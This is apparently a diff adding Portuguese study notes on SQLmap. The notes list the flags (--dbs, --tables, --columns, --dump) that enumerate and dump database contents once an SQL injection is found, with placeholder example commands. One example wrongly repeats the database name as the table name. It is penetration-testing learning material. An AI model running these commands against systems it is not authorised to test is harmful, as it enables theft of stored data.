@@ -1,0 +1,31 @@
+__________________________________________
+\\EXTRAIR INFORMAÇÕES DO BANCO DE DADOS//
+-----------------------------------------
+
+Se o SQLmap encontrar uma vulnerabilidade de SQL Injection, podemos voltar a correr o comando com algumas flags que
+nos permitem visualizar informação do banco de dados. Vamos supor que o SQLmap descobriu uma vulnerabilidade de SQL
+Injection a partir do seguinte comando: sqlmap -r /home/usuarioKali/Desktop/requisicao.txt
+
+--dbs Permite listar o nome dos bancos de dados do servidor de bancos de dados
+Ex: sqlmap -r /home/usuarioKali/Desktop/requisicao.txt --dbs
+
+-D nome_db --tables Permite listar o nome das tabelas do banco de dados especificado
+Ex: sqlmap -r /home/usuarioKali/Desktop/requisicao.txt -D nome_db --tables
+
+-D nome_db -T nome_tabela --dump Permite listar os registos de uma tabela especificada pertencente a um banco de
+dados também especificado.
+Ex: sqlmap -r /home/usuarioKali/Desktop/requisicao.txt -D nome_db -T nome_tabela --dump
+
+-------------------------------------------------------------------------------
+
+Se o SQLmap encontrar uma vulnerabilidade de SQL Injection, podemos voltar a correr o comando com algumas flags que
+nos permitem visualizar informação do banco de dados. Vamos supor que o SQLmap descobriu uma vulnerabilidade de SQL
+Injection a partir do seguinte comando: sqlmap -r /home/usuarioKali/Desktop/requisicao.txt
+
+-D nome_db -T nome_tabela --columns Permite listar o nome das colunas da tabela especificada pertencente a um banco
+de dados também especificado.
+Ex: sqlmap -r /home/usuarioKali/Desktop/requisicao.txt -D nome_db -T nome_tabela --columns
+
+-D nome_db -T nome_tabela -C nome_col1,nome_col2 --dump Permite listar a informação guardada nas colunas
+especificadas, que se encontram dentro da tabela especificada que se encontra dentro do banco de dados especificado.
+Ex: sqlmap -r /home/usuarioKali/Desktop/requisicao.txt -D nome_db -T nome_db -C nome_col1,nome_col2 --dump
